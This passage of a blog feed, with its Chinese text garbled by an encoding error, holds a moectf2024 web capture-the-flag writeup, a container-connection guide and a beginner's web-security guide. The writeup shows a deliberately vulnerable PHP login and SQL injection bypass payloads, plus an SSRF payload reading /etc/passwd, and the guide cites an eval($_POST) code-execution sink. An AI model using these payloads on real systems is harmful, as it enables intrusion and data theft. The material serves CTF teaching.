class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>)&#123;</span><br><span class="line">    <span class="variable">$verify_code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;verify_code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éªŒè¯éªŒè¯ç </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$verify_code</span>) || <span class="variable">$verify_code</span> !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;éªŒè¯ç é”™è¯¯å•¦ï¼Œå†è¾“å…¥å§&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/&quot;</span>, <span class="variable">$email</span>)||<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or/i&quot;</span>, <span class="variable">$email</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;ä¸å­˜åœ¨é‚®ç®±ä¸ºï¼š &#x27;</span>.<span class="variable">$email</span>.<span class="string">&#x27; çš„ç®¡ç†å‘˜è´¦å·ï¼&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pwd</span>);</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;xdsec&quot;</span>,<span class="number">3306</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE email=&#x27;<span class="subst">$email</span>&#x27; AND pwd=&#x27;<span class="subst">$pwd</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_email&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">1</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;ç™»é™†æˆåŠŸï¼Œmoectf&#123;testflag&#125;&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;ç®¡ç†å‘˜é‚®ç®±æˆ–å¯†ç é”™è¯¯&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å­˜åœ¨sqlæ³¨å…¥ï¼Œç™»å½•æˆåŠŸå³è¿”å›flag, ä½†æ˜¯orè¢«banäº†ï¼Œè¿˜æœ‰æ­£åˆ™ï¼ŒéªŒè¯ç æ­£å¸¸å¡«ï¼Œåœ¨emailè¿™é‡Œæ³¨å…¥ï¼Œå¯†ç éšä¾¿å¡«</p><p>ç»•è¿‡æ–¹æ³•å¾ˆå¤šï¼Œç®€å•åˆ—ä¸¾</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span><span class="variable">@a</span>.b<span class="string">&#x27; || 1=1 #</span></span><br><span class="line"><span class="string">123@a.b&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure><h2 id="ImageCloudå‰ç½®"><a href="#ImageCloudå‰ç½®" class="headerlink" title="ImageCloudå‰ç½®"></a>ImageCloudå‰ç½®</h2><p>ç»å…¸çš„ssrf<code>payload: file:///etc/passwd</code></p><h2 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a>ImageCloud</h2><p>éšä¾¿ä¼ ä¸ªæ–‡ä»¶ï¼Œç‚¹å‡»å·²ä¸Šä¼ æ–‡ä»¶æŸ¥çœ‹ï¼Œå‘ç°urlä¸­æœ‰<code>/image?url=http://localhost:5000/static/&#123;filename&#125;</code></p><p>é¢˜ç›®ç»™äº†æºç æ–‡ä»¶ï¼Œ5000ç«¯å£æ˜ å°„åœ¨å¤–ç½‘ï¼Œä½†æ˜¯app2.pyè¿è¡Œåœ¨ä¸€ä¸ªéšæœºç«¯å£ï¼ˆ5001-6000ï¼‰éœ€è¦å€ŸåŠ©ssrfçˆ†ç ´å†…ç½‘app2çš„ç«¯å£</p><p><img src="/2024/10/10/moectf2024-Web-wp/img2.png"></p><p>å¯ä»¥é€šè¿‡æš´éœ²å‡ºæ¥çš„æœåŠ¡æ‰“ssrfçˆ†ç ´app2çš„è¿è¡Œç«¯å£ï¼Œä»è€Œå€ŸåŠ©ssrfçªƒå–å†…ç½‘app2çš„å›¾ç‰‡</p><p><img src="/2024/10/10/moectf2024-Web-wp/img3.png"></p>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2024-windowsç”¨æˆ·å®¹å™¨è¿æ¥</title>
    <link href="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/"/>
    <url>/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<p>â€‹å…³äºå¾ˆå¤šäººä½¿ç”¨wslå’Œè™šæ‹Ÿæœºè¿æ¥å®¹å™¨å‡ºç°çš„é—®é¢˜åšä¸€ä¸ªç®€å•æŒ‡å¯¼ï¼Œæœ¬æ–‡ä»…æŒ‡å¯¼wslä»¥åŠè™šæ‹Ÿæœºçš„è¿æ¥æ–¹å¼</p><ol><li>å¼€å¯å®¹å™¨å¹¶ç²˜è´´wsrxé“¾æ¥<img src="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/image1.png">ä¸€å®šä¸€å®šåˆ«å¤åˆ¶æ—è¾¹çš„127.0.0.1:xxxxå»è®¿é—®</li><li>ä¿®æ”¹wsrxé…ç½®<img src="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/image2.png"></li><li>ç²˜è´´åˆ°wsrxä¸­å¹¶ç‚¹å‡»å³è¾¹ç®­å¤´</li><li>æ‰“å¼€è¿æ¥æƒ…å†µæŸ¥çœ‹<img src="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/image3.png">æœ‰ä¸€ä¸ª0.0.0.0:xxxxè€Œä¸ç”¨127.0.0.1:xxxxï¼Œè®°å½•:åçš„ç«¯å£</li><li>æŸ¥çœ‹ä½ çš„è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼æ˜¯å¦æ˜¯natæ¨¡å¼<img src="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/image4.png">ä¸æ˜¯è¯·ä¿®æ”¹ä¸ºnatæ¨¡å¼ï¼Œä¸è¿‡ä¸€èˆ¬é»˜è®¤æ˜¯natæ¨¡å¼</li><li>æŸ¥çœ‹å¹¶å…³é—­windowsä¸‹å…¬ç”¨ç½‘ç»œé˜²ç«å¢™<img src="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/image5.png"></li><li>åœ¨ä½ çš„windowsç»ˆç«¯ä¸­è¾“å…¥ipconfigæŸ¥çœ‹ip<img src="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/image6.png">è®°ä½è¿™ä¸¤ä¸ªçš„ä»»æ„ä¸€ä¸ªï¼ˆwslå°±ä¸è¦è®°å½•VMnet8é‚£ä¸ªäº†)</li><li>åœ¨è™šæ‹Ÿæœºä¸­è®¿é—®è®°å½•çš„ip:è®°å½•çš„ç«¯å£ï¼Œä¾‹å¦‚æˆ‘çš„ 192.168.89.1:60785ï¼ˆwslä¸èƒ½ç”¨è¿™ä¸ªï¼‰<img src="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/image7.png">æˆ–10.x.x.x:60785<img src="/2024/09/04/moectf2024-windows%E7%94%A8%E6%88%B7%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/image8.png">ï¼Œpwné¢˜çš„è¯å°±å¯ncè¿æ¥ï¼Œæ¯”å¦‚ nc ip port</li></ol>]]></content>
    
    
    <categories>
      
      <category>è½¯ä»¶æ“ä½œ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œæŒ‡å¯¼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webå…¥é—¨æŒ‡åŒ—</title>
    <link href="/2024/09/03/web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/"/>
    <url>/2024/09/03/web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<h1 id="moectf2024-webå…¥é—¨æŒ‡åŒ—"><a href="#moectf2024-webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="moectf2024 webå…¥é—¨æŒ‡åŒ—"></a>moectf2024 webå…¥é—¨æŒ‡åŒ—</h1><p>xt</p><hr><p>moectf2024ï¼š<img src="/2024/09/03/web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/image.jpg"></p><h2 id="ä¸€-webæ˜¯å•¥"><a href="#ä¸€-webæ˜¯å•¥" class="headerlink" title="ä¸€.webæ˜¯å•¥"></a>ä¸€.webæ˜¯å•¥</h2><p>äº’è”ç½‘æ—¶ä»£ï¼Œwebåº”ç”¨ä»¥åŠæ¶‰åŠåˆ°ç”Ÿæ´»ä¸­çš„æ–¹æ–¹é¢é¢ï¼Œä¸åç«¯äº¤äº’çš„è½¯ä»¶å‘€ï¼Œæµè§ˆå™¨çœ‹åˆ°çš„webç½‘é¡µå‘€ã€‚ctfä¸­webä¸€èˆ¬æ¶‰åŠwebç½‘é¡µå®‰å…¨ï¼Œé€šè¿‡åˆ©ç”¨ç½‘é¡µå‰åç«¯çš„æ¼æ´ï¼ˆä»£ç æ¼æ´ä¹Ÿå¥½ï¼ŒæœåŠ¡å™¨æ¼æ´ä¹Ÿå¥½ï¼‰è·å–å…³é”®æ•°æ®flagï¼Œä¸€ä¸Šæ¥é¦–å…ˆéœ€è¦å¤§å®¶è‡ªå·±æ­å»ºä¸€ä¸ªåŸºæœ¬çš„ç½‘ç«™ï¼Œäº†è§£ç½‘ç«™çš„åŸºæœ¬æ¶æ„ï¼Œè¿ç½‘ç«™æ˜¯æ€ä¹ˆè¿è¡Œçš„éƒ½ä¸çŸ¥é“ä½•è°ˆæ‰¾æ¼æ´å‘¢ã€‚</p><h2 id="äºŒ-å­¦ä¹ æ–¹æ³•"><a href="#äºŒ-å­¦ä¹ æ–¹æ³•" class="headerlink" title="äºŒ.å­¦ä¹ æ–¹æ³•"></a>äºŒ.å­¦ä¹ æ–¹æ³•</h2><p>é¦–å½“å…¶è¦ï¼Œä¸æ‡‚å°±æœï¼ˆå–„ç”¨aiå’Œæœç´¢å¼•æ“ï¼Œå°åˆ°è½¯ä»¶æ€ä¹ˆä½¿ç”¨ï¼Œå¤§åˆ°æŸä¸€ä¸ªåºå¤§çš„çŸ¥è¯†ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨å¤šä¸ªæœç´¢å¼•æ“ï¼Œæ¨ègoogleå’Œ<a href="http://www.bingï¼‰ï¼Œä¸æ‡‚å°±é—®ï¼ˆå¤§é›ªå‚å¿…å¤‡æŠ€èƒ½---è„¸çš®åšï¼‰ï¼Œæ¨èblogç½‘ç«™ï¼šå…ˆçŸ¥ç¤¾åŒºï¼Œfreebuf">www.bingï¼‰ï¼Œä¸æ‡‚å°±é—®ï¼ˆå¤§é›ªå‚å¿…å¤‡æŠ€èƒ½---è„¸çš®åšï¼‰ï¼Œæ¨èblogç½‘ç«™ï¼šå…ˆçŸ¥ç¤¾åŒºï¼Œfreebuf</a></p><h2 id="ä¸‰-å­¦ä¹ è·¯çº¿"><a href="#ä¸‰-å­¦ä¹ è·¯çº¿" class="headerlink" title="ä¸‰.å­¦ä¹ è·¯çº¿"></a>ä¸‰.å­¦ä¹ è·¯çº¿</h2><h3 id="é…ç½®ç¯å¢ƒï¼ˆæœ€éš¾æœ€çƒ¦-ï¼šä½ å¯ä»¥å»æœæ•™ç¨‹çœ‹æ–‡æ¡£ï¼Œåœ¨é…ç½®æœŸé—´ä½ å¯èƒ½ä¼šé‡åˆ°å„ç§å„ç§çœ‹ä¸æ‡‚å¾—é”™è¯¯ï¼Œè¦æœ‰è€å¿ƒï¼Œç¯å¢ƒéœ€è¦è¾¹å­¦è¾¹é…ç½®ï¼Œè¿™é‡Œç®€å•åˆ—ä¸¾å¥½ç”¨çš„"><a href="#é…ç½®ç¯å¢ƒï¼ˆæœ€éš¾æœ€çƒ¦-ï¼šä½ å¯ä»¥å»æœæ•™ç¨‹çœ‹æ–‡æ¡£ï¼Œåœ¨é…ç½®æœŸé—´ä½ å¯èƒ½ä¼šé‡åˆ°å„ç§å„ç§çœ‹ä¸æ‡‚å¾—é”™è¯¯ï¼Œè¦æœ‰è€å¿ƒï¼Œç¯å¢ƒéœ€è¦è¾¹å­¦è¾¹é…ç½®ï¼Œè¿™é‡Œç®€å•åˆ—ä¸¾å¥½ç”¨çš„" class="headerlink" title="é…ç½®ç¯å¢ƒï¼ˆæœ€éš¾æœ€çƒ¦)ï¼šä½ å¯ä»¥å»æœæ•™ç¨‹çœ‹æ–‡æ¡£ï¼Œåœ¨é…ç½®æœŸé—´ä½ å¯èƒ½ä¼šé‡åˆ°å„ç§å„ç§çœ‹ä¸æ‡‚å¾—é”™è¯¯ï¼Œè¦æœ‰è€å¿ƒï¼Œç¯å¢ƒéœ€è¦è¾¹å­¦è¾¹é…ç½®ï¼Œè¿™é‡Œç®€å•åˆ—ä¸¾å¥½ç”¨çš„"></a>é…ç½®ç¯å¢ƒï¼ˆæœ€éš¾æœ€çƒ¦)ï¼šä½ å¯ä»¥å»æœæ•™ç¨‹çœ‹æ–‡æ¡£ï¼Œåœ¨é…ç½®æœŸé—´ä½ å¯èƒ½ä¼šé‡åˆ°å„ç§å„ç§çœ‹ä¸æ‡‚å¾—é”™è¯¯ï¼Œè¦æœ‰è€å¿ƒï¼Œç¯å¢ƒéœ€è¦è¾¹å­¦è¾¹é…ç½®ï¼Œè¿™é‡Œç®€å•åˆ—ä¸¾å¥½ç”¨çš„</h3><p>1.linuxæ“ä½œç³»ç»Ÿéœ€è¦å­¦ä¹ ï¼ˆå…ˆå­¦ä¼šç®€å•ä½¿ç”¨shellï¼‰ä½¿ç”¨vmè™šæ‹Ÿæœºè£…ä¸ªlinuxå‘è¡Œç‰ˆå§ï¼Œç”¨å¤šäº†ç›¸ä¿¡ä½ ä¼šå–œæ¬¢linux</p><p>2.æµè§ˆå™¨åŠå…¶æ’ä»¶ï¼ˆhackbarï¼ŒProxySwitchyOmegaï¼ŒWappalyzerï¼‰</p><p>3.å¸¸ç”¨å·¥å…·ï¼ˆBurpSuiteï¼ŒPHPStudyï¼ŒAntswordï¼Œdirsearchï¼‰å®‰è£…ä½¿ç”¨æƒ³å¿…ä½ ä¼šè‡ªå·±æœå­</p><p>4.æ‚ä¸ƒæ‚å…«ï¼ˆclashï¼ŒuToolsï¼ŒEverythingï¼‰è¿˜æœ‰ä¸€äº›å¸¸ç”¨çš„ç½‘ç«™ï¼ˆfofa,cmd5,ç«™é•¿ä¹‹å®¶ï¼‰ç­‰ç­‰</p><h2 id="è·¯çº¿æŒ‡å—ï¼š"><a href="#è·¯çº¿æŒ‡å—ï¼š" class="headerlink" title="è·¯çº¿æŒ‡å—ï¼š"></a>è·¯çº¿æŒ‡å—ï¼š</h2><h3 id="åŸºç¡€çŸ¥è¯†ï¼šï¼ˆç›®æ ‡æ­å»ºè‡ªå·±çš„ç¬¬ä¸€ä¸ªç½‘ç«™ï¼‰"><a href="#åŸºç¡€çŸ¥è¯†ï¼šï¼ˆç›®æ ‡æ­å»ºè‡ªå·±çš„ç¬¬ä¸€ä¸ªç½‘ç«™ï¼‰" class="headerlink" title="åŸºç¡€çŸ¥è¯†ï¼šï¼ˆç›®æ ‡æ­å»ºè‡ªå·±çš„ç¬¬ä¸€ä¸ªç½‘ç«™ï¼‰"></a>åŸºç¡€çŸ¥è¯†ï¼šï¼ˆç›®æ ‡æ­å»ºè‡ªå·±çš„ç¬¬ä¸€ä¸ªç½‘ç«™ï¼‰</h3><p>1.åŸºæœ¬çš„ç½‘ç»œåè®®ï¼ˆé‡ç‚¹<strong>http</strong>ï¼‰httpçš„è¯·æ±‚å¤´è¯·æ±‚ä½“è¯·æ±‚æ–¹æ³•</p><p>2.ç¼–ç ä¸åŠ è§£å¯†çŸ¥è¯†ï¼Œç»å…¸çš„base64ï¼Œhashç­‰ç­‰ï¼Œéœ€è¦ä¸€ç‚¹åŸºæœ¬çš„å¯†ç çŸ¥è¯†<br>å¯ä¾›å‚è€ƒçš„èµ„æ–™ï¼š<a href="https://www.cnblogs.com/ruoli-s/p/14206145.html">https://www.cnblogs.com/ruoli-s/p/14206145.html</a></p><p>3.è®¤è¯æ–¹æ³•ï¼ˆ<strong>cookieï¼Œsessionï¼Œjwt</strong>ï¼‰</p><p>4.å‰ç«¯ä¸‰è¦ç´ ï¼ˆ<strong>html</strong>ï¼Œcssï¼Œ<strong>javascript</strong>ï¼‰cssçŸ¥é“å°±å¥½ï¼Œç²—ä½“ä¸ºé‡ç‚¹</p><p>5.åç«¯ï¼ˆå…ˆä»æœ€ç®€å•çš„<strong>php</strong>å¼€å§‹ï¼‰å¼€å‘ç®€å•åŠ¨æ€ç½‘ç«™ï¼ˆä½¿ç”¨phpstudyæˆ–è€…æ‰‹åŠ¨å®‰è£…lampï¼‰</p><p>6.æ•°æ®åº“ï¼ˆå…ˆç®€å•å­¦ä¹ <strong>Mysql</strong>ï¼‰èƒ½å®ç°å¢åˆ æ”¹æŸ¥</p><p>7.ä¸€ä¸ªè¶æ‰‹çš„è„šæœ¬è¯­è¨€ï¼ˆæ¨è<strong>python</strong>ï¼‰èƒ½å¤Ÿå®ç°ç®€å•çˆ¬è™«7.å­¦ä¼šä½¿ç”¨é‡è¦çš„å·¥å…·ï¼Œåˆšå¼€å§‹ä¸ç”¨é™·å…¥å­¦å·¥å…·ï¼Œç®€å•å­¦ä¼šä½¿ç”¨burpsuiteå°±è¡Œ</p><h3 id="ä¿¡æ¯æœé›†ï¼š"><a href="#ä¿¡æ¯æœé›†ï¼š" class="headerlink" title="ä¿¡æ¯æœé›†ï¼š"></a>ä¿¡æ¯æœé›†ï¼š</h3><p><em>çŸ¥é“ä¸€ä¸ªç½‘ç«™æ˜¯ä»€ä¹ˆæ¡†æ¶ç­‰ç­‰</em></p><h3 id="åˆæ¢æ¼æ´ï¼š"><a href="#åˆæ¢æ¼æ´ï¼š" class="headerlink" title="åˆæ¢æ¼æ´ï¼š"></a>åˆæ¢æ¼æ´ï¼š</h3><p>webæ¼æ´å¤šåˆ°æ•°ä¸æ¸…ï¼Œå…ˆä»top10å­¦èµ·ï¼Œä»¥ä¸‹åªç»™éƒ¨åˆ†ä»‹ç»ï¼Œå¯ä»¥ä»phpè¯­è¨€æ¥çœ‹è¿™äº›æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œåˆæ€æ ·ä¿®è¡¥é¿å…å‘¢ï¼Œæ”»å‡»æ—¶æ€ä¹ˆç»•è¿‡æŸäº›é˜»ç¢</p><h4 id="1-sqlæ³¨å…¥"><a href="#1-sqlæ³¨å…¥" class="headerlink" title="1.sqlæ³¨å…¥"></a>1.sqlæ³¨å…¥</h4><p>å°±æ˜¯æ‹¼æ¥sqlè¯­å¥å®ç°è¯»å–æ•°æ®åº“ä¿¡æ¯ï¼ˆä¿¡æ¯æ³„éœ²ï¼‰ï¼Œç¯¡æ”¹ï¼Œç”šè‡³åˆ é™¤æ•°æ®åº“ä¿¡æ¯ï¼Œæœ‰å¤šç§æ³¨å…¥æ–¹å¼å’Œåˆ©ç”¨æŠ€å·§ï¼Œæ³¨å…¥ç±»çš„æ¼æ´å¾ˆå¤šä½†éƒ½å¤§å·®ä¸å·®ï¼Œsqlæ³¨å…¥ç®—æ˜¯ç»å…¸ä¸­çš„ç»å…¸ï¼Œå­¦ä¹ çš„æ—¶å€™ä¸è¦åªçœ‹ä¸æ“ä½œï¼Œå¯ä»¥æ‰¾é¶åœºç©ç©</p><p>æ¨èé¶åœºï¼šsql-libs</p><h4 id="2-phpçš„å®‰å…¨é—®é¢˜"><a href="#2-phpçš„å®‰å…¨é—®é¢˜" class="headerlink" title="2.phpçš„å®‰å…¨é—®é¢˜"></a>2.phpçš„å®‰å…¨é—®é¢˜</h4><p>phpä½¿ç”¨ä¸å½“ä¼šå®¹æ˜“å‡ºç°å¾ˆå¤šæ¼æ´ï¼Œ&#x3D;&#x3D;ï¼Œ&#x3D;&#x3D;&#x3D;ä½¿ç”¨ä¸å½“å¯¼è‡´phpå¼±ç±»å‹å‘€å•¥çš„ï¼Œè€Œä¸”phpè¯­è¨€å¤ªçµæ´»å®¹æ˜“è¢«åˆ©ç”¨</p><p><strong>æ–‡ä»¶åŒ…å«</strong>ï¼Œä¸»è¦ç”±å‡½æ•°include()ï¼Œrequire()ï¼Œinclude_once()ï¼Œrequire_once()é€ æˆä»–ä»¬åŒ…å«çš„æ–‡ä»¶ä¼šè¢«è§£ææˆphpä»£ç æ‰§è¡Œ</p><p><strong>å˜é‡è¦†ç›–</strong>ï¼Œå…³é”®å˜é‡èƒ½è¢«ç”¨æˆ·æ§åˆ¶ä»è€Œå¯¼è‡´é—®é¢˜</p><p><strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong>ï¼ˆ<strong>rce</strong>ï¼‰ï¼Œæ¯”å¦‚eval()ä¸­çš„ä»£ç èƒ½å¤Ÿè®©ç”¨æˆ·æ§åˆ¶ï¼ˆeval($_POST[â€˜codeâ€™]);ï¼‰</p><p>ç­‰ç­‰ç§ç§</p><h4 id="3-å‰ç«¯å®‰å…¨ï¼ˆxss-csrfç­‰ç­‰ï¼‰"><a href="#3-å‰ç«¯å®‰å…¨ï¼ˆxss-csrfç­‰ç­‰ï¼‰" class="headerlink" title="3.å‰ç«¯å®‰å…¨ï¼ˆxss, csrfç­‰ç­‰ï¼‰"></a>3.å‰ç«¯å®‰å…¨ï¼ˆxss, csrfç­‰ç­‰ï¼‰</h4><p>ç”±å‰ç«¯é€ æˆçš„æ¼æ´</p><p><strong>xss</strong>ï¼šç”¨æˆ·é€šè¿‡htmlæ³¨å…¥ç¯¡æ”¹ç½‘é¡µå‰ç«¯ï¼Œä¸€èˆ¬æ’å…¥javascriptä½¿å¾—åˆ«äººè®¿é—®æ—¶è‡ªåŠ¨è¿è¡Œï¼Œæ¯”å¦‚è¯„è®ºåŒºå•¥çš„å¾ˆå¤šå¾ˆå¤šç”šè‡³ç”¨æˆ·åéƒ½è¡Œï¼Œåªè¦æ²¡å•¥è¿‡æ»¤ï¼Œéƒ½å¯ä»¥è®©æµè§ˆå™¨æ¸²æŸ“æ‰§è¡Œï¼Œctfä¸­ä¸»è¦æ˜¯çªƒå–cookie<br><em>æ¨èé¶åœºï¼šxss-libs</em></p><p><strong>Csrf</strong>: æ”»å‡»è€…å¯ä»¥ä½¿å¾—å—å®³è€…å‘é€httpçš„è¯·æ±‚ï¼ˆå¦‚æœå—å®³è€…çš„tokenæ²¡è¿‡æœŸçš„è¯ï¼Œå˜¿å˜¿ï¼‰</p><h4 id="4-æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆssrf"><a href="#4-æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆssrf" class="headerlink" title="4.æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆssrf)"></a>4.æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆssrf)</h4><p>ç”¨æˆ·èƒ½ä½¿æœåŠ¡å™¨å‘é€httpè¯·æ±‚ï¼Œä¸€èˆ¬æˆ‘ä»¬æ˜¯å‘æœåŠ¡å™¨å‘è¯·æ±‚ï¼Œè€Œssrfæ˜¯ä½¿å¾—æœåŠ¡å™¨è®¡ç®—æœºå‘å‡ºhttpè¯·æ±‚</p><h4 id="5-æ–‡ä»¶ä¸Šä¼ "><a href="#5-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="5.æ–‡ä»¶ä¸Šä¼ "></a>5.æ–‡ä»¶ä¸Šä¼ </h4><p>ç”¨æˆ·åœ¨ä¸Šä¼ æ–‡ä»¶åŠŸèƒ½çš„åœ°æ–¹ï¼ˆå¤´åƒå‘€ä»€ä¹ˆçš„ï¼‰ä¸Šä¼ å¯æ‰§è¡Œè„šæœ¬è·å¾—shellï¼ˆphpä¸€å¥è¯æœ¨é©¬ï¼‰ï¼Œåœ¨æœåŠ¡å™¨å¯ä»¥æ‰§è¡Œæœ‰å®³å‘½ä»¤</p><h4 id="6-å…¶ä»–"><a href="#6-å…¶ä»–" class="headerlink" title="6.å…¶ä»–"></a>6.å…¶ä»–</h4><p>å„ç§è¯­è¨€çš„ååºåˆ—åŒ–ï¼ŒnodejsåŸå‹é“¾æ±¡æŸ“ï¼Œ sstiï¼Œxxeï¼Œå„ç§cmsï¼Œç»„ä»¶æ¼æ´å•¥çš„</p><h2 id="å››-ç»ƒä¹ "><a href="#å››-ç»ƒä¹ " class="headerlink" title="å››.ç»ƒä¹ "></a>å››.ç»ƒä¹ </h2><h3 id="é¶åœºæ¨è"><a href="#é¶åœºæ¨è" class="headerlink" title="é¶åœºæ¨è"></a>é¶åœºæ¨è</h3><ul><li>æ”»é˜²ä¸–ç•Œï¼ˆæœ‰å…¥é—¨é¶åœºï¼‰</li><li>Bugku</li><li>Buuctf</li><li>ctfhub</li><li>Nssctf</li></ul><p>ä¸ä¼šå¯ä»¥æŸ¥çœ‹wp,ä¸€å®šææ¸…æ¥šåŸç†,å¯ä»¥å­¦å®Œä¸€ä¸ªæ¼æ´å°±æ‰¾ç›¸åŒç±»å‹çš„é¶åœºæ‰“ä¸€æ‰“ï¼ˆçjbä¹±æ‰“ä¸æ˜¯å¾ˆå»ºè®®ï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mini L-CTF 2024 Writeup</title>
    <link href="/2024/05/10/miniL2024-wp/"/>
    <url>/2024/05/10/miniL2024-wp/</url>
    
